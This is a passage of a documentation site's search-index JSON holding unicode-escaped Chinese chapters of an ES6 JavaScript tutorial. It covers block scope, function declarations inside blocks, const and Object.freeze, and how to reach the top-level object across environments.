insane = 'Hello World'}\n}}}};\n</code></pre> <p>\u5757\u7ea7\u4f5c\u7528\u57df\u7684\u51fa\u73b0\uff0c\u5b9e\u9645\u4e0a\u4f7f\u5f97\u83b7\u5f97\u5e7f\u6cdb\u5e94\u7528\u7684\u533f\u540d\u7acb\u5373\u6267\u884c\u51fd\u6570\u8868\u8fbe\u5f0f\uff08\u533f\u540d IIFE\uff09\u4e0d\u518d\u5fc5\u8981\u4e86\u3002</p> <pre><code>// IIFE \u5199\u6cd5\n(function () {\n  var tmp = ...;\n  ...\n}());\n\n// \u5757\u7ea7\u4f5c\u7528\u57df\u5199\u6cd5\n{\n  let tmp = ...;\n  ...\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_7","title":"\u5757\u7ea7\u4f5c\u7528\u57df\u4e0e\u51fd\u6570\u58f0\u660e","text":"<p>\u51fd\u6570\u80fd\u4e0d\u80fd\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u4e4b\u4e2d\u58f0\u660e\uff1f\u8fd9\u662f\u4e00\u4e2a\u76f8\u5f53\u4ee4\u4eba\u6df7\u6dc6\u7684\u95ee\u9898\u3002</p> <p>ES5 \u89c4\u5b9a\uff0c\u51fd\u6570\u53ea\u80fd\u5728\u9876\u5c42\u4f5c\u7528\u57df\u548c\u51fd\u6570\u4f5c\u7528\u57df\u4e4b\u4e2d\u58f0\u660e\uff0c\u4e0d\u80fd\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u58f0\u660e\u3002</p> <pre><code>// \u60c5\u51b5\u4e00\nif (true) {\n  function f() {}\n}\n\n// \u60c5\u51b5\u4e8c\ntry {\n  function f() {}\n} catch(e) {\n  // ...\n}\n</code></pre> <p>\u4e0a\u9762\u4e24\u79cd\u51fd\u6570\u58f0\u660e\uff0c\u6839\u636e ES5 \u7684\u89c4\u5b9a\u90fd\u662f\u975e\u6cd5\u7684\u3002</p> <p>\u4f46\u662f\uff0c\u6d4f\u89c8\u5668\u6ca1\u6709\u9075\u5b88\u8fd9\u4e2a\u89c4\u5b9a\uff0c\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u65e7\u4ee3\u7801\uff0c\u8fd8\u662f\u652f\u6301\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u4e4b\u4e2d\u58f0\u660e\u51fd\u6570\uff0c\u56e0\u6b64\u4e0a\u9762\u4e24\u79cd\u60c5\u51b5\u5b9e\u9645\u90fd\u80fd\u8fd0\u884c\uff0c\u4e0d\u4f1a\u62a5\u9519\u3002</p> <p>ES6 \u5f15\u5165\u4e86\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u660e\u786e\u5141\u8bb8\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u4e4b\u4e2d\u58f0\u660e\u51fd\u6570\u3002ES6 \u89c4\u5b9a\uff0c\u5757\u7ea7\u4f5c\u7528\u57df\u4e4b\u4e2d\uff0c\u51fd\u6570\u58f0\u660e\u8bed\u53e5\u7684\u884c\u4e3a\u7c7b\u4f3c\u4e8e<code>let</code>\uff0c\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u4e4b\u5916\u4e0d\u53ef\u5f15\u7528\u3002</p> <pre><code>function f() { console.log('I am outside!'); }\n\n(function () {\n  if (false) {\n    // \u91cd\u590d\u58f0\u660e\u4e00\u6b21\u51fd\u6570f\n    function f() { console.log('I am inside!'); }\n  }\n\n  f();\n}());\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728 ES5 \u4e2d\u8fd0\u884c\uff0c\u4f1a\u5f97\u5230\u201cI am inside!\u201d\uff0c\u56e0\u4e3a\u5728<code>if</code>\u5185\u58f0\u660e\u7684\u51fd\u6570<code>f</code>\u4f1a\u88ab\u63d0\u5347\u5230\u51fd\u6570\u5934\u90e8\uff0c\u5b9e\u9645\u8fd0\u884c\u7684\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>// ES5 \u73af\u5883\nfunction f() { console.log('I am outside!'); }\n\n(function () {\n  function f() { console.log('I am inside!'); }\n  if (false) {\n  }\n  f();\n}());\n</code></pre> <p>ES6 \u5c31\u5b8c\u5168\u4e0d\u4e00\u6837\u4e86\uff0c\u7406\u8bba\u4e0a\u4f1a\u5f97\u5230\u201cI am outside!\u201d\u3002\u56e0\u4e3a\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u58f0\u660e\u7684\u51fd\u6570\u7c7b\u4f3c\u4e8e<code>let</code>\uff0c\u5bf9\u4f5c\u7528\u57df\u4e4b\u5916\u6ca1\u6709\u5f71\u54cd\u3002\u4f46\u662f\uff0c\u5982\u679c\u4f60\u771f\u7684\u5728 ES6 \u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u4e00\u4e0b\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u662f\u4f1a\u62a5\u9519\u7684\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f</p> <pre><code>// \u6d4f\u89c8\u5668\u7684 ES6 \u73af\u5883\nfunction f() { console.log('I am outside!'); }\n\n(function () {\n  if (false) {\n    // \u91cd\u590d\u58f0\u660e\u4e00\u6b21\u51fd\u6570f\n    function f() { console.log('I am inside!'); }\n  }\n\n  f();\n}());\n// Uncaught TypeError: f is not a function\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u5728 ES6 \u6d4f\u89c8\u5668\u4e2d\uff0c\u90fd\u4f1a\u62a5\u9519\u3002</p> <p>\u539f\u6765\uff0c\u5982\u679c\u6539\u53d8\u4e86\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u58f0\u660e\u7684\u51fd\u6570\u7684\u5904\u7406\u89c4\u5219\uff0c\u663e\u7136\u4f1a\u5bf9\u8001\u4ee3\u7801\u4ea7\u751f\u5f88\u5927\u5f71\u54cd\u3002\u4e3a\u4e86\u51cf\u8f7b\u56e0\u6b64\u4ea7\u751f\u7684\u4e0d\u517c\u5bb9\u95ee\u9898\uff0cES6 \u5728\u9644\u5f55 B\u91cc\u9762\u89c4\u5b9a\uff0c\u6d4f\u89c8\u5668\u7684\u5b9e\u73b0\u53ef\u4ee5\u4e0d\u9075\u5b88\u4e0a\u9762\u7684\u89c4\u5b9a\uff0c\u6709\u81ea\u5df1\u7684\u884c\u4e3a\u65b9\u5f0f\u3002</p> <ul> <li>\u5141\u8bb8\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u58f0\u660e\u51fd\u6570\u3002</li> <li>\u51fd\u6570\u58f0\u660e\u7c7b\u4f3c\u4e8e<code>var</code>\uff0c\u5373\u4f1a\u63d0\u5347\u5230\u5168\u5c40\u4f5c\u7528\u57df\u6216\u51fd\u6570\u4f5c\u7528\u57df\u7684\u5934\u90e8\u3002</li> <li>\u540c\u65f6\uff0c\u51fd\u6570\u58f0\u660e\u8fd8\u4f1a\u63d0\u5347\u5230\u6240\u5728\u7684\u5757\u7ea7\u4f5c\u7528\u57df\u7684\u5934\u90e8\u3002</li> </ul> <p>\u6ce8\u610f\uff0c\u4e0a\u9762\u4e09\u6761\u89c4\u5219\u53ea\u5bf9 ES6 \u7684\u6d4f\u89c8\u5668\u5b9e\u73b0\u6709\u6548\uff0c\u5176\u4ed6\u73af\u5883\u7684\u5b9e\u73b0\u4e0d\u7528\u9075\u5b88\uff0c\u8fd8\u662f\u5c06\u5757\u7ea7\u4f5c\u7528\u57df\u7684\u51fd\u6570\u58f0\u660e\u5f53\u4f5c<code>let</code>\u5904\u7406\u3002</p> <p>\u6839\u636e\u8fd9\u4e09\u6761\u89c4\u5219\uff0c\u6d4f\u89c8\u5668\u7684 ES6 \u73af\u5883\u4e2d\uff0c\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u58f0\u660e\u7684\u51fd\u6570\uff0c\u884c\u4e3a\u7c7b\u4f3c\u4e8e<code>var</code>\u58f0\u660e\u7684\u53d8\u91cf\u3002\u4e0a\u9762\u7684\u4f8b\u5b50\u5b9e\u9645\u8fd0\u884c\u7684\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>// \u6d4f\u89c8\u5668\u7684 ES6 \u73af\u5883\nfunction f() { console.log('I am outside!'); }\n(function () {\n  var f = undefined;\n  if (false) {\n    function f() { console.log('I am inside!'); }\n  }\n\n  f();\n}());\n// Uncaught TypeError: f is not a function\n</code></pre> <p>==\u8003\u8651\u5230\u73af\u5883\u5bfc\u81f4\u7684\u884c\u4e3a\u5dee\u5f02\u592a\u5927\uff0c\u5e94\u8be5\u907f\u514d\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u58f0\u660e\u51fd\u6570\u3002==\u5982\u679c\u786e\u5b9e\u9700\u8981\uff0c\u4e5f\u5e94\u8be5\u5199\u6210\u51fd\u6570\u8868\u8fbe\u5f0f\uff0c\u800c\u4e0d\u662f\u51fd\u6570\u58f0\u660e\u8bed\u53e5\u3002</p> <pre><code>// \u5757\u7ea7\u4f5c\u7528\u57df\u5185\u90e8\u7684\u51fd\u6570\u58f0\u660e\u8bed\u53e5\uff0c\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\n{\n  let a = 'secret';\n  function f() {\n    return a;\n  }\n}\n\n// \u5757\u7ea7\u4f5c\u7528\u57df\u5185\u90e8\uff0c\u4f18\u5148\u4f7f\u7528\u51fd\u6570\u8868\u8fbe\u5f0f\n{\n  let a = 'secret';\n  let f = function () {\n    return a;\n  };\n}\n</code></pre> <p>\u53e6\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u3002ES6 \u7684\u5757\u7ea7\u4f5c\u7528\u57df\u5fc5\u987b\u6709\u5927\u62ec\u53f7\uff0c\u5982\u679c\u6ca1\u6709\u5927\u62ec\u53f7\uff0cJavaScript \u5f15\u64ce\u5c31\u8ba4\u4e3a\u4e0d\u5b58\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u3002</p> <pre><code>// \u7b2c\u4e00\u79cd\u5199\u6cd5\uff0c\u62a5\u9519\nif (true) let x = 1;\n\n// \u7b2c\u4e8c\u79cd\u5199\u6cd5\uff0c\u4e0d\u62a5\u9519\nif (true) {\n  let x = 1;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u79cd\u5199\u6cd5\u6ca1\u6709\u5927\u62ec\u53f7\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u800c<code>let</code>\u53ea\u80fd\u51fa\u73b0\u5728\u5f53\u524d\u4f5c\u7528\u57df\u7684\u9876\u5c42\uff0c\u6240\u4ee5\u62a5\u9519\u3002\u7b2c\u4e8c\u79cd\u5199\u6cd5\u6709\u5927\u62ec\u53f7\uff0c\u6240\u4ee5\u5757\u7ea7\u4f5c\u7528\u57df\u6210\u7acb\u3002</p> <p>\u51fd\u6570\u58f0\u660e\u4e5f\u662f\u5982\u6b64\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u53ea\u80fd\u58f0\u660e\u5728\u5f53\u524d\u4f5c\u7528\u57df\u7684\u9876\u5c42\u3002</p> <pre><code>// \u4e0d\u62a5\u9519\n'use strict';\nif (true) {\n  function f() {}\n}\n\n// \u62a5\u9519\n'use strict';\nif (true)\n  function f() {}\n</code></pre>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#const","title":"const","text":""},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_8","title":"\u57fa\u672c\u7528\u6cd5","text":"<p><code>const</code>\u58f0\u660e\u4e00\u4e2a\u53ea\u8bfb\u7684\u5e38\u91cf\u3002\u4e00\u65e6\u58f0\u660e\uff0c\u5e38\u91cf\u7684\u503c\u5c31\u4e0d\u80fd\u6539\u53d8\u3002</p> <pre><code>const PI = 3.1415;\n</code></pre> <p><code>const</code>\u58f0\u660e\u7684\u53d8\u91cf\u4e0d\u5f97\u6539\u53d8\u503c\uff0c\u8fd9\u610f\u5473\u7740\uff0c<code>const</code>\u4e00\u65e6\u58f0\u660e\u53d8\u91cf\uff0c\u5c31\u5fc5\u987b\u7acb\u5373\u521d\u59cb\u5316\uff0c\u4e0d\u80fd\u7559\u5230\u4ee5\u540e\u8d4b\u503c\u3002</p> <pre><code>const foo;\n// SyntaxError: Missing initializer in const declaration\n</code></pre> <p><code>const</code>\u7684\u4f5c\u7528\u57df\u4e0e<code>let</code>\u547d\u4ee4\u76f8\u540c\uff1a\u53ea\u5728\u58f0\u660e\u6240\u5728\u7684\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u6709\u6548\u3002</p> <pre><code>if (true) {\n  const MAX = 5;\n}\n</code></pre> <p><code>const</code>\u547d\u4ee4\u58f0\u660e\u7684\u5e38\u91cf\u4e5f\u662f\u4e0d\u63d0\u5347\uff0c\u540c\u6837\u5b58\u5728\u6682\u65f6\u6027\u6b7b\u533a\uff0c\u53ea\u80fd\u5728\u58f0\u660e\u7684\u4f4d\u7f6e\u540e\u9762\u4f7f\u7528\u3002</p> <pre><code>if (true) {\n  console.log(MAX); // ReferenceError\n  const MAX = 5;\n}\n</code></pre> <p><code>const</code>\u58f0\u660e\u7684\u5e38\u91cf\uff0c\u4e5f\u4e0e<code>let</code>\u4e00\u6837\u4e0d\u53ef\u91cd\u590d\u58f0\u660e\u3002</p>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_9","title":"\u4e0d\u53ef\u53d8\u672c\u8d28","text":"<p><code>const</code>\u5b9e\u9645\u4e0a\u4fdd\u8bc1\u7684\uff0c\u5e76\u4e0d\u662f\u53d8\u91cf\u7684\u503c\u4e0d\u5f97\u6539\u52a8\uff0c\u800c\u662f\u53d8\u91cf\u6307\u5411\u7684\u90a3\u4e2a\u5185\u5b58\u5730\u5740\u6240\u4fdd\u5b58\u7684\u6570\u636e\u4e0d\u5f97\u6539\u52a8\u3002\u5bf9\u4e8e\u7b80\u5355\u7c7b\u578b\u7684\u6570\u636e\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\uff09\uff0c\u503c\u5c31\u4fdd\u5b58\u5728\u53d8\u91cf\u6307\u5411\u7684\u90a3\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u56e0\u6b64\u7b49\u540c\u4e8e\u5e38\u91cf\u3002\u4f46\u5bf9\u4e8e\u590d\u5408\u7c7b\u578b\u7684\u6570\u636e\uff08\u4e3b\u8981\u662f\u5bf9\u8c61\u548c\u6570\u7ec4\uff09\uff0c\u53d8\u91cf\u6307\u5411\u7684\u5185\u5b58\u5730\u5740\uff0c\u4fdd\u5b58\u7684\u53ea\u662f\u4e00\u4e2a\u6307\u5411\u5b9e\u9645\u6570\u636e\u7684\u6307\u9488\uff0c<code>const</code>\u53ea\u80fd\u4fdd\u8bc1\u8fd9\u4e2a\u6307\u9488\u662f\u56fa\u5b9a\u7684\uff08\u5373\u603b\u662f\u6307\u5411\u53e6\u4e00\u4e2a\u56fa\u5b9a\u7684\u5730\u5740\uff09\uff0c\u81f3\u4e8e\u5b83\u6307\u5411\u7684\u6570\u636e\u7ed3\u6784\u662f\u4e0d\u662f\u53ef\u53d8\u7684\uff0c\u5c31\u5b8c\u5168\u4e0d\u80fd\u63a7\u5236\u4e86\u3002\u56e0\u6b64\uff0c\u5c06\u4e00\u4e2a\u5bf9\u8c61\u58f0\u660e\u4e3a\u5e38\u91cf\u5fc5\u987b\u975e\u5e38\u5c0f\u5fc3\u3002</p> <pre><code>const foo = {};\n\n// \u4e3a foo \u6dfb\u52a0\u4e00\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u6210\u529f\nfoo.prop = 123;\nfoo.prop // 123\n\n// \u5c06 foo \u6307\u5411\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\nfoo = {}; // TypeError: \"foo\" is read-only\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5e38\u91cf<code>foo</code>\u50a8\u5b58\u7684\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002\u4e0d\u53ef\u53d8\u7684\u53ea\u662f\u8fd9\u4e2a\u5730\u5740\uff0c\u5373\u4e0d\u80fd\u628a<code>foo</code>\u6307\u5411\u53e6\u4e00\u4e2a\u5730\u5740\uff0c\u4f46\u5bf9\u8c61\u672c\u8eab\u662f\u53ef\u53d8\u7684\uff0c\u6240\u4ee5\u4f9d\u7136\u53ef\u4ee5\u4e3a\u5176\u6dfb\u52a0\u65b0\u5c5e\u6027\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const a = [];\na.push('Hello'); // \u53ef\u6267\u884c\na.length = 0;    // \u53ef\u6267\u884c\na = ['Dave'];    // \u62a5\u9519\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5e38\u91cf<code>a</code>\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u8fd9\u4e2a\u6570\u7ec4\u672c\u8eab\u662f\u53ef\u5199\u7684\uff0c\u4f46\u662f\u5982\u679c\u5c06\u53e6\u4e00\u4e2a\u6570\u7ec4\u8d4b\u503c\u7ed9<code>a</code>\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u5982\u679c\u771f\u7684\u60f3\u5c06\u5bf9\u8c61\u51bb\u7ed3\uff0c\u5e94\u8be5\u4f7f\u7528<code>Object.freeze</code>\u65b9\u6cd5\u3002</p> <pre><code>const foo = Object.freeze({});\n\n// \u5e38\u89c4\u6a21\u5f0f\u65f6\uff0c\u4e0b\u9762\u4e00\u884c\u4e0d\u8d77\u4f5c\u7528\uff1b\n// \u4e25\u683c\u6a21\u5f0f\u65f6\uff0c\u8be5\u884c\u4f1a\u62a5\u9519\nfoo.prop = 123;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5e38\u91cf<code>foo</code>\u6307\u5411\u4e00\u4e2a\u51bb\u7ed3\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u6dfb\u52a0\u65b0\u5c5e\u6027\u4e0d\u8d77\u4f5c\u7528\uff0c\u4e25\u683c\u6a21\u5f0f\u65f6\u8fd8\u4f1a\u62a5\u9519\u3002</p> <p>\u9664\u4e86\u5c06\u5bf9\u8c61\u672c\u8eab\u51bb\u7ed3\uff0c\u5bf9\u8c61\u7684\u5c5e\u6027\u4e5f\u5e94\u8be5\u51bb\u7ed3\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u5c06\u5bf9\u8c61\u5f7b\u5e95\u51bb\u7ed3\u7684\u51fd\u6570\u3002</p> <pre><code>var constantize = (obj) =&gt; {\n  Object.freeze(obj);\n  Object.keys(obj).forEach( (key, i) =&gt; {\n    if ( typeof obj[key] === 'object' ) {\n      constantize( obj[key] );\n    }\n  });\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#es6_1","title":"ES6 \u58f0\u660e\u53d8\u91cf\u7684\u516d\u79cd\u65b9\u6cd5","text":"<p>ES5 \u53ea\u6709\u4e24\u79cd\u58f0\u660e\u53d8\u91cf\u7684\u65b9\u6cd5\uff1a<code>var</code>\u547d\u4ee4\u548c<code>function</code>\u547d\u4ee4\u3002ES6 \u9664\u4e86\u6dfb\u52a0<code>let</code>\u548c<code>const</code>\u547d\u4ee4\uff0c\u540e\u9762\u7ae0\u8282\u8fd8\u4f1a\u63d0\u5230\uff0c\u53e6\u5916\u4e24\u79cd\u58f0\u660e\u53d8\u91cf\u7684\u65b9\u6cd5\uff1a<code>import</code>\u547d\u4ee4\u548c<code>class</code>\u547d\u4ee4\u3002\u6240\u4ee5\uff0cES6 \u4e00\u5171\u6709 6 \u79cd\u58f0\u660e\u53d8\u91cf\u7684\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_10","title":"\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027","text":"<p>\u9876\u5c42\u5bf9\u8c61\uff0c\u5728\u6d4f\u89c8\u5668\u73af\u5883\u6307\u7684\u662f<code>window</code>\u5bf9\u8c61\uff0c\u5728 Node \u6307\u7684\u662f<code>global</code>\u5bf9\u8c61\u3002ES5 \u4e4b\u4e2d\uff0c\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u4e0e\u5168\u5c40\u53d8\u91cf\u662f\u7b49\u4ef7\u7684\u3002</p> <pre><code>window.a = 1;\na // 1\n\na = 2;\nwindow.a // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u8d4b\u503c\u4e0e\u5168\u5c40\u53d8\u91cf\u7684\u8d4b\u503c\uff0c\u662f\u540c\u4e00\u4ef6\u4e8b\u3002</p> <p>\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u4e0e\u5168\u5c40\u53d8\u91cf\u6302\u94a9\uff0c\u88ab\u8ba4\u4e3a\u662f JavaScript \u8bed\u8a00\u6700\u5927\u7684\u8bbe\u8ba1\u8d25\u7b14\u4e4b\u4e00\u3002\u8fd9\u6837\u7684\u8bbe\u8ba1\u5e26\u6765\u4e86\u51e0\u4e2a\u5f88\u5927\u7684\u95ee\u9898\uff0c\u9996\u5148\u662f\u6ca1\u6cd5\u5728\u7f16\u8bd1\u65f6\u5c31\u62a5\u51fa\u53d8\u91cf\u672a\u58f0\u660e\u7684\u9519\u8bef\uff0c\u53ea\u6709\u8fd0\u884c\u65f6\u624d\u80fd\u77e5\u9053\uff08\u56e0\u4e3a\u5168\u5c40\u53d8\u91cf\u53ef\u80fd\u662f\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u521b\u9020\u7684\uff0c\u800c\u5c5e\u6027\u7684\u521b\u9020\u662f\u52a8\u6001\u7684\uff09\uff1b\u5176\u6b21\uff0c\u7a0b\u5e8f\u5458\u5f88\u5bb9\u6613\u4e0d\u77e5\u4e0d\u89c9\u5730\u5c31\u521b\u5efa\u4e86\u5168\u5c40\u53d8\u91cf\uff08\u6bd4\u5982\u6253\u5b57\u51fa\u9519\uff09\uff1b\u6700\u540e\uff0c\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u662f\u5230\u5904\u53ef\u4ee5\u8bfb\u5199\u7684\uff0c\u8fd9\u975e\u5e38\u4e0d\u5229\u4e8e\u6a21\u5757\u5316\u7f16\u7a0b\u3002\u53e6\u4e00\u65b9\u9762\uff0c<code>window</code>\u5bf9\u8c61\u6709\u5b9e\u4f53\u542b\u4e49\uff0c\u6307\u7684\u662f\u6d4f\u89c8\u5668\u7684\u7a97\u53e3\u5bf9\u8c61\uff0c\u9876\u5c42\u5bf9\u8c61\u662f\u4e00\u4e2a\u6709\u5b9e\u4f53\u542b\u4e49\u7684\u5bf9\u8c61\uff0c\u4e5f\u662f\u4e0d\u5408\u9002\u7684\u3002</p> <p>ES6 \u4e3a\u4e86\u6539\u53d8\u8fd9\u4e00\u70b9\uff0c\u4e00\u65b9\u9762\u89c4\u5b9a\uff0c\u4e3a\u4e86\u4fdd\u6301\u517c\u5bb9\u6027\uff0c<code>var</code>\u547d\u4ee4\u548c<code>function</code>\u547d\u4ee4\u58f0\u660e\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u4f9d\u65e7\u662f\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\uff1b\u53e6\u4e00\u65b9\u9762\u89c4\u5b9a\uff0c<code>let</code>\u547d\u4ee4\u3001<code>const</code>\u547d\u4ee4\u3001<code>class</code>\u547d\u4ee4\u58f0\u660e\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u4e0d\u5c5e\u4e8e\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4ece ES6 \u5f00\u59cb\uff0c\u5168\u5c40\u53d8\u91cf\u5c06\u9010\u6b65\u4e0e\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u8131\u94a9\u3002</p> <pre><code>var a = 1;\n// \u5982\u679c\u5728 Node \u7684 REPL \u73af\u5883\uff0c\u53ef\u4ee5\u5199\u6210 global.a\n// \u6216\u8005\u91c7\u7528\u901a\u7528\u65b9\u6cd5\uff0c\u5199\u6210 this.a\nwindow.a // 1\n\nlet b = 1;\nwindow.b // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5168\u5c40\u53d8\u91cf<code>a</code>\u7531<code>var</code>\u547d\u4ee4\u58f0\u660e\uff0c\u6240\u4ee5\u5b83\u662f\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\uff1b\u5168\u5c40\u53d8\u91cf<code>b</code>\u7531<code>let</code>\u547d\u4ee4\u58f0\u660e\uff0c\u6240\u4ee5\u5b83\u4e0d\u662f\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u8fd4\u56de<code>undefined</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#this","title":"This \u5168\u5c40\u5bf9\u8c61","text":"<p>JavaScript \u8bed\u8a00\u5b58\u5728\u4e00\u4e2a\u9876\u5c42\u5bf9\u8c61\uff0c\u5b83\u63d0\u4f9b\u5168\u5c40\u73af\u5883\uff08\u5373\u5168\u5c40\u4f5c\u7528\u57df\uff09\uff0c\u6240\u6709\u4ee3\u7801\u90fd\u662f\u5728\u8fd9\u4e2a\u73af\u5883\u4e2d\u8fd0\u884c\u3002\u4f46\u662f\uff0c\u9876\u5c42\u5bf9\u8c61\u5728\u5404\u79cd\u5b9e\u73b0\u91cc\u9762\u662f\u4e0d\u7edf\u4e00\u7684\u3002</p> <ul> <li>\u6d4f\u89c8\u5668\u91cc\u9762\uff0c\u9876\u5c42\u5bf9\u8c61\u662f<code>window</code>\uff0c\u4f46 Node \u548c Web Worker \u6ca1\u6709<code>window</code>\u3002</li> <li>\u6d4f\u89c8\u5668\u548c Web Worker \u91cc\u9762\uff0c<code>self</code>\u4e5f\u6307\u5411\u9876\u5c42\u5bf9\u8c61\uff0c\u4f46\u662f Node \u6ca1\u6709<code>self</code>\u3002</li> <li>Node \u91cc\u9762\uff0c\u9876\u5c42\u5bf9\u8c61\u662f<code>global</code>\uff0c\u4f46\u5176\u4ed6\u73af\u5883\u90fd\u4e0d\u652f\u6301\u3002</li> </ul> <p>\u540c\u4e00\u6bb5\u4ee3\u7801\u4e3a\u4e86\u80fd\u591f\u5728\u5404\u79cd\u73af\u5883\uff0c\u90fd\u80fd\u53d6\u5230\u9876\u5c42\u5bf9\u8c61\uff0c\u73b0\u5728\u4e00\u822c\u662f\u4f7f\u7528<code>this</code>\u53d8\u91cf\uff0c\u4f46\u662f\u6709\u5c40\u9650\u6027\u3002</p> <ul> <li>\u5168\u5c40\u73af\u5883\u4e2d\uff0c<code>this</code>\u4f1a\u8fd4\u56de\u9876\u5c42\u5bf9\u8c61\u3002\u4f46\u662f\uff0cNode \u6a21\u5757\u548c ES6 \u6a21\u5757\u4e2d\uff0c<code>this</code>\u8fd4\u56de\u7684\u662f\u5f53\u524d\u6a21\u5757\u3002</li> <li>\u51fd\u6570\u91cc\u9762\u7684<code>this</code>\uff0c\u5982\u679c\u51fd\u6570\u4e0d\u662f\u4f5c\u4e3a\u5bf9\u8c61\u7684\u65b9\u6cd5\u8fd0\u884c\uff0c\u800c\u662f\u5355\u7eaf\u4f5c\u4e3a\u51fd\u6570\u8fd0\u884c\uff0c<code>this</code>\u4f1a\u6307\u5411\u9876\u5c42\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u65f6<code>this</code>\u4f1a\u8fd4\u56de<code>undefined</code>\u3002</li> <li>\u4e0d\u7ba1\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd8\u662f\u666e\u901a\u6a21\u5f0f\uff0c<code>new Function('return this')()</code>\uff0c\u603b\u662f\u4f1a\u8fd4\u56de\u5168\u5c40\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u5982\u679c\u6d4f\u89c8\u5668\u7528\u4e86 CSP\uff08Content Security Policy\uff0c\u5185\u5bb9\u5b89\u5168\u7b56\u7565\uff09\uff0c\u90a3\u4e48<code>eval</code>\u3001<code>new Function</code>\u8fd9\u4e9b\u65b9\u6cd5\u90fd\u53ef\u80fd\u65e0\u6cd5\u4f7f\u7528\u3002</li> </ul> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u5f88\u96be\u627e\u5230\u4e00\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u6240\u6709\u60c5\u51b5\u4e0b\uff0c\u90fd\u53d6\u5230\u9876\u5c42\u5bf9\u8c61\u3002\u4e0b\u9762\u662f\u4e24\u79cd\u52c9\u5f3a\u53ef\u4ee5\u4f7f\u7528\u7684\u65b9\u6cd5\u3002</p> <pre><code>// \u65b9\u6cd5\u4e00\n(typeof window !== 'undefined' ? window\n   : (typeof process === 'object' &amp;&amp; typeof require === 'function' &amp;&amp; typeof global === 'object') ? global : this);\n\n// 